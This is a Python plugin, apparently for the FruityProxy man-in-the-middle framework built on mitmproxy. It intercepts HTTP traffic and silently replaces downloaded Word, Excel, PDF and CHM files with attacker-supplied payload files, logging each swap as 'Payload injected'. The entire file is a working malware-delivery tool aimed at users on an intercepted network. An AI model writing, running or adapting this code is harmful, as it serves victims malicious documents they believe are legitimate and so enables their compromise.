#!/usr/bin/env python

# Copyright (C) 2015 xtr4nge [_AT_] gmail.com
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#

import os
import sys
import subprocess
import time

from libmproxy import controller, proxy
from libmproxy.proxy.server import ProxyServer
from libmproxy.protocol.http import decoded # mitmproxy 0.12


import logging
from configobj import ConfigObj
from plugins.plugin import Plugin

logger = logging.getLogger("fruityproxy")

class Delivery(Plugin):
    name = "Delivery"
    version = "1.0"
    content = "content/Delivery/"
    
    def request(self, flow):
        pass


    def response(self, flow):
        pass
        
        #print flow.__dict__
    
        if "application" in flow.response.headers['Content-Type'][0]:
            
            if os.path.isdir(self.content) == False:
                self.createDir()
            
            with decoded(flow.response):  # automatically decode gzipped responses.
                
                client_conn = str(flow.client_conn)
                server_conn = str(flow.server_conn)
            
                client_conn = client_conn.split(" ")[1]
                client_conn = client_conn.split(":")[0]
                
                thePath = flow.request.path
                theUrl = flow.request.url
                
                temp = thePath.split("/")
                temp = temp[len(temp) - 1]
                temp = temp.split("?")[0]			
                theFile = temp.split(".")
                
                theTime = time.strftime("%Y-%m-%d %H:%M:%S")
                flag = False
                
                if theFile[-1].lower() == "doc":
                    flow.response.content = self.injectPayloadReplace(theFile[-1])
                    flag = True
                    
                if theFile[-1].lower() == "docm":
                    flow.response.content = self.injectPayloadReplace(theFile[-1])
                    flag = True
                    
                if theFile[-1].lower() == "xls":
                    flow.response.content = self.injectPayloadReplace(theFile[-1])
                    flag = True
                    
                if theFile[-1].lower() == "xlsm":
                    flow.response.content = self.injectPayloadReplace(theFile[-1])
                    flag = True
                    
                if theFile[-1].lower() == "pdf":
                    flow.response.content = self.injectPayloadReplace(theFile[-1])
                    flag = True
                
                if theFile[-1].lower() == "chm":
                    flow.response.content = self.injectPayloadReplace(theFile[-1])
                    flag = True
                
                if flag:
                    logger.debug("["+self.name+"] [" + theFile[-1].upper() + "] Payload injected > " + temp )
            
    def injectPayloadReplace(self, fileType):
        pass
    
        if fileType == "doc":
            filePath = self.content + "payload.doc"	
        elif fileType == "docm":
            filePath = self.content + "payload.docm"
        elif fileType == "xls":
            filePath = self.content + "payload.xls"
        elif fileType == "xlsm":
            filePath = self.content + "payload.xlsm"
        elif fileType == "pdf":
            filePath = self.content + "payload.pdf"
        elif fileType == "chm":
            filePath = self.content + "payload.chm"
            
        fileTemp = open(filePath, 'rb')
        fileStream = fileTemp.read()
        fileTemp.close()
    
        return fileStream
    
    def createDir(self):
        try:
            os.makedirs(self.content)
        except OSError:
            pass
